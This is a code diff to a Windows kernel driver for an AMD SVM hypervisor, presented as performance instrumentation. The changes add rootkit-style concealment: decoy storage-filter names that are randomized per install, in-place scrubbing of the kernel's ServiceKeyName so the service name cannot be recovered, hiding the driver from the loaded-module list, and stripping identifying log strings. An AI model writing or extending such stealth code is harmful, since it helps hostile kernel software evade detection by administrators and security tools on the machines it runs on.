@@ -1,12 +1,13 @@
-/* the_chamber.c -- driver skeleton for THE_CHAMBER AMD SVM ring-0
+/* the_chamber.c -- driver skeleton for the AMD SVM ring-0
  * performance-instrumentation driver.
  *
  * Responsibilities handled here:
  *   - DriverEntry + unload
- *   - Device + symlink creation
+ *   - Device + symlink creation (names sourced from g_chamber_cfg)
  *   - IRP_MJ_CREATE / _CLOSE / _DEVICE_CONTROL dispatch
  *   - Crash-marker safety (refuse to load if previous session left marker)
  *   - Watchdog timer (auto-unload if user-mode stops kicking)
+ *   - Phase 1.7 scrub of DriverExtension->ServiceKeyName
  *
  * SVM/NPT/VMEXIT cluster implementations live in separate .c files and are
  * called via the externs declared in the_chamber.h.
@@ -14,8 +15,31 @@
 
 #include "the_chamber.h"
 #include "stealth.h"
+#include "timing.h"
 
 CHAMBER_GLOBALS g_chamber;
+
+/* Phase 1.5: process-lifetime spin lock for PsLoadedModuleList edits.
+ * Initialized once in DriverEntry; declared extern in the_chamber.h. */
+KSPIN_LOCK g_stealth_lock;
+
+/* Phase 1.7: runtime-patchable config blob in a dedicated section. The
+ * launcher locates the section by name (".cfg") and the magic field, then
+ * overwrites device_path/symlink_path/marker_path with a per-install
+ * randomized name before signing and loading the driver. Defaults below
+ * look like a generic storage-filter driver so that a fresh build that
+ * skipped the launcher is still non-obvious. */
+#pragma section(".cfg", read, write)
+__declspec(allocate(".cfg"))
+CHAMBER_CFG g_chamber_cfg = {
+    CHAMBER_CFG_MAGIC_V1,
+    1,
+    L"\\Device\\PciStor",
+    L"\\DosDevices\\PciStor",
+    L"\\??\\C:\\Windows\\System32\\config\\pcistor.dat",
+    0,
+    { 0 }
+};
 
 /* --- Forward decls --- */
 DRIVER_INITIALIZE DriverEntry;
@@ -32,6 +56,8 @@ static void start_watchdog(void);
 static void stop_watchdog(void);
 static void reset_watchdog(void);
 
+static void scrub_service_key_name(PDRIVER_OBJECT Driver);
+
 /* --- Crash marker file ops (via ZwCreateFile / ZwWriteFile) --- */
 static NTSTATUS crash_marker_present(BOOLEAN *out_present)
 {
@@ -42,7 +68,7 @@ static NTSTATUS crash_marker_present(BOOLEAN *out_present)
     NTSTATUS st;
 
     *out_present = FALSE;
-    RtlInitUnicodeString(&path, THE_CHAMBER_MARKER_PATH);
+    RtlInitUnicodeString(&path, g_chamber_cfg.marker_path);
     InitializeObjectAttributes(&oa, &path,
         OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 
@@ -71,7 +97,7 @@ static NTSTATUS crash_marker_drop(void)
     NTSTATUS st;
     UCHAR marker_bytes[1] = { 0x01 };
 
-    RtlInitUnicodeString(&path, THE_CHAMBER_MARKER_PATH);
+    RtlInitUnicodeString(&path, g_chamber_cfg.marker_path);
     InitializeObjectAttributes(&oa, &path,
         OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 
@@ -97,7 +123,7 @@ static NTSTATUS crash_marker_clear(void)
     NTSTATUS st;
     FILE_DISPOSITION_INFORMATION disp;
 
-    RtlInitUnicodeString(&path, THE_CHAMBER_MARKER_PATH);
+    RtlInitUnicodeString(&path, g_chamber_cfg.marker_path);
     InitializeObjectAttributes(&oa, &path,
         OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 
@@ -138,9 +164,8 @@ static void watchdog_dpc_routine(PKDPC Dpc, PVOID Ctx, PVOID Sa1, PVOID Sa2)
     ULONGLONG delta_ms = delta_100ns / 10000ULL;
 
     if (delta_ms > WATCHDOG_TIMEOUT_MS) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_WARNING_LEVEL,
-            "WinHvMon: watchdog timeout (%llu ms) -- requesting unload\n",
-            delta_ms);
+        CHAMBER_LOG_WARN("watchdog timeout (%llu ms) -- requesting unload\n",
+                         delta_ms);
         InterlockedExchange(&g_chamber.unload_requested, 1);
         /* Signal any per-CPU shutdown flags so VMRUN loops exit */
         if (g_cpu_ctx) {
@@ -177,6 +202,52 @@ static void reset_watchdog(void)
     g_chamber.last_kick_time = now;
     KeReleaseSpinLock(&g_chamber.state_lock, irql);
     InterlockedIncrement(&g_chamber.kick_counter);
+}
+
+/* --- Phase 1.7: scrub DriverExtension->ServiceKeyName ---
+ *
+ * DriverExtension->ServiceKeyName is a kernel-owned UNICODE_STRING whose
+ * Buffer holds the service registry sub-key name (e.g. "winhvmon"). It
+ * survives any DriverObject-level rename done by stealth_apply, because
+ * it lives on the DriverExtension, which we leave intact so the loader
+ * can still find us during unload. An enumerator that grabs the Driver
+ * object and reads ServiceKeyName reconstructs the original service name.
+ *
+ * Deleting the kernel registry key from user land doesn't help: the Buffer
+ * is a kernel COPY captured at load time. We overwrite the buffer in place
+ * with noise. Tread carefully -- a few paths (ObReferenceObjectByName of
+ * the driver by its registry name) read it, but on a never-unload stealth
+ * driver no legitimate consumer should care. */
+static void scrub_service_key_name(PDRIVER_OBJECT Driver)
+{
+    UNICODE_STRING *skn;
+    USHORT chars;
+    USHORT i;
+    ULONGLONG seed;
+
+    /* On x64 Windows, DRIVER_OBJECT.DriverExtension is a pointer the loader
+     * fills in; ntddk.h exposes the pointee as DRIVER_EXTENSION whose
+     * first field is ServiceKeyName. We do NOT touch DriverExtension
+     * itself -- only the string buffer it holds -- so the unload path
+     * that walks DriverExtension continues to work. */
+    if (!Driver || !Driver->DriverExtension) return;
+    skn = &Driver->DriverExtension->ServiceKeyName;
+    if (!skn->Buffer || !skn->MaximumLength) return;
+
+    /* Overwrite the entire buffer with a rotating noise pattern, keeping
+     * the UNICODE_STRING metadata (Length / MaximumLength) in sync so
+     * downstream readers still see a well-formed, nul-terminated string
+     * of the same length. Simple LCG seeded from TSC + address so each
+     * load differs. */
+    chars = skn->MaximumLength / sizeof(WCHAR);
+    seed  = __rdtsc() ^ (ULONGLONG)(ULONG_PTR)skn;
+    for (i = 0; i + 1 < chars; i++) {
+        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
+        /* Printable lowercase ASCII, kept inside WCHAR. */
+        skn->Buffer[i] = (WCHAR)(L'a' + ((seed >> 33) % 26));
+    }
+    if (chars > 0) skn->Buffer[chars - 1] = L'\0';
+    if (skn->Length >= sizeof(WCHAR)) skn->Length -= sizeof(WCHAR);
 }
 
 /* --- IRP handlers --- */
@@ -230,8 +301,7 @@ NTSTATUS IrpDeviceControl(PDEVICE_OBJECT Device, PIRP Irp)
         st = STATUS_SUCCESS;
         break;
     case IOCTL_THE_CHAMBER_SHUTDOWN:
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-            "WinHvMon: shutdown IOCTL received\n");
+        CHAMBER_LOG("shutdown IOCTL received\n");
         InterlockedExchange(&g_chamber.unload_requested, 1);
         if (g_cpu_ctx) {
             for (ULONG i = 0; i < g_cpu_count; i++) {
@@ -253,9 +323,8 @@ NTSTATUS IrpDeviceControl(PDEVICE_OBJECT Device, PIRP Irp)
 /* --- Unload --- */
 VOID UnloadRoutine(PDRIVER_OBJECT Driver)
 {
-    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-        "WinHvMon: unload begin (vmexits=%llu, kicks=%ld)\n",
-        g_vmexit_count, g_chamber.kick_counter);
+    CHAMBER_LOG("unload begin (vmexits=%llu, kicks=%ld)\n",
+                g_vmexit_count, g_chamber.kick_counter);
 
     /* Restore ourselves to PsLoadedModuleList + DriverObject BEFORE any
      * of the IO-manager cleanup paths run. */
@@ -274,7 +343,7 @@ VOID UnloadRoutine(PDRIVER_OBJECT Driver)
     vmexit_cleanup();
 
     UNICODE_STRING sym;
-    RtlInitUnicodeString(&sym, THE_CHAMBER_SYMLINK);
+    RtlInitUnicodeString(&sym, g_chamber_cfg.symlink_path);
     IoDeleteSymbolicLink(&sym);
 
     if (Driver->DeviceObject) {
@@ -283,8 +352,7 @@ VOID UnloadRoutine(PDRIVER_OBJECT Driver)
 
     crash_marker_clear();
 
-    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-        "WinHvMon: unload complete\n");
+    CHAMBER_LOG("unload complete\n");
 }
 
 /* --- Entry --- */
@@ -296,32 +364,42 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
     PDEVICE_OBJECT device = NULL;
     BOOLEAN marker_present = FALSE;
 
-    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-        "WinHvMon: DriverEntry (version 0x%08x)\n", THE_CHAMBER_VERSION);
+    CHAMBER_LOG("DriverEntry (version 0x%08x)\n", THE_CHAMBER_VERSION);
 
     RtlZeroMemory(&g_chamber, sizeof(g_chamber));
     g_chamber.driver_object = Driver;
     KeInitializeSpinLock(&g_chamber.state_lock);
+    /* Phase 1.5: initialize the stealth lock ONCE here. stealth.c now
+     * acquires it without reinitializing. */
+    KeInitializeSpinLock(&g_stealth_lock);
     KeQuerySystemTimePrecise(&g_chamber.last_kick_time);
+
+    /* Phase 1.7: scrub the kernel-owned ServiceKeyName copy. Done early so
+     * that even a concurrent enumerator racing with our bringup sees noise
+     * instead of the registry subkey name. */
+    scrub_service_key_name(Driver);
+
+    /* Sanity-check the config blob the launcher was supposed to patch. */
+    if (g_chamber_cfg.magic != CHAMBER_CFG_MAGIC_V1) {
+        CHAMBER_LOG_ERR("config blob magic mismatch 0x%08x\n",
+                        g_chamber_cfg.magic);
+        return STATUS_INVALID_PARAMETER;
+    }
 
     /* Crash-marker safety: refuse to load if the previous session left one */
     st = crash_marker_present(&marker_present);
     if (!NT_SUCCESS(st)) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_WARNING_LEVEL,
-            "WinHvMon: marker probe failed 0x%08x -- continuing\n", st);
+        CHAMBER_LOG_WARN("marker probe failed 0x%08x -- continuing\n", st);
     }
     if (marker_present) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
-            "WinHvMon: crash marker from previous session present -- "
-            "refusing to load. Delete C:\\Windows\\System32\\config\\winhvmon.dat "
-            "manually once you have verified the system.\n");
+        CHAMBER_LOG_ERR("crash marker from previous session present -- "
+                        "refusing to load\n");
         return STATUS_UNSUCCESSFUL;
     }
 
     /* SVM support probe */
     if (!svm_is_supported()) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
-            "WinHvMon: SVM not supported / disabled by firmware\n");
+        CHAMBER_LOG_ERR("SVM not supported / disabled by firmware\n");
         return STATUS_NOT_SUPPORTED;
     }
 
@@ -330,15 +408,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
      * next boot refuses to load. */
     (void)crash_marker_drop();
 
-    /* Device + symlink */
-    RtlInitUnicodeString(&dev, THE_CHAMBER_DEVICE_NAME);
-    RtlInitUnicodeString(&sym, THE_CHAMBER_SYMLINK);
+    /* Device + symlink, both sourced from the patchable config blob. */
+    RtlInitUnicodeString(&dev, g_chamber_cfg.device_path);
+    RtlInitUnicodeString(&sym, g_chamber_cfg.symlink_path);
 
     st = IoCreateDevice(Driver, 0, &dev, FILE_DEVICE_UNKNOWN,
         FILE_DEVICE_SECURE_OPEN, FALSE, &device);
     if (!NT_SUCCESS(st)) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
-            "WinHvMon: IoCreateDevice failed 0x%08x\n", st);
+        CHAMBER_LOG_ERR("IoCreateDevice failed 0x%08x\n", st);
         goto fail;
     }
     g_chamber.device_object = device;
@@ -346,8 +423,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
 
     st = IoCreateSymbolicLink(&sym, &dev);
     if (!NT_SUCCESS(st)) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
-            "WinHvMon: IoCreateSymbolicLink failed 0x%08x\n", st);
+        CHAMBER_LOG_ERR("IoCreateSymbolicLink failed 0x%08x\n", st);
         goto fail;
     }
 
@@ -359,8 +435,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
     /* NPT first (VMCB needs the n_cr3 PA) */
     st = npt_init();
     if (!NT_SUCCESS(st)) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
-            "WinHvMon: npt_init failed 0x%08x\n", st);
+        CHAMBER_LOG_ERR("npt_init failed 0x%08x\n", st);
         goto fail;
     }
     g_chamber.npt_initialized = TRUE;
@@ -368,20 +443,22 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT Driver, PUNICODE_STRING RegPath)
     /* SVM per-CPU bringup */
     st = svm_init_all_cpus();
     if (!NT_SUCCESS(st)) {
-        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
-            "WinHvMon: svm_init_all_cpus failed 0x%08x\n", st);
+        CHAMBER_LOG_ERR("svm_init_all_cpus failed 0x%08x\n", st);
         goto fail;
     }
     g_chamber.svm_initialized = TRUE;
 
+    /* Phase 1.2: set the pessimistic default microcode round-trip cost that
+     * timing_update() adds to every captured host interval. */
+    timing_calibrate();
+
     start_watchdog();
     crash_marker_clear();  /* init complete -- next boot can load again */
 
-    /* Self-hide: remove from PsLoadedModuleList + null driver name. */
+    /* Self-hide: rename our KLDR entry + null driver name. */
     (void)stealth_apply(Driver);
 
-    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
-        "WinHvMon: ready (cpus=%u)\n", g_cpu_count);
+    CHAMBER_LOG("ready (cpus=%u)\n", g_cpu_count);
     return STATUS_SUCCESS;
 
 fail:
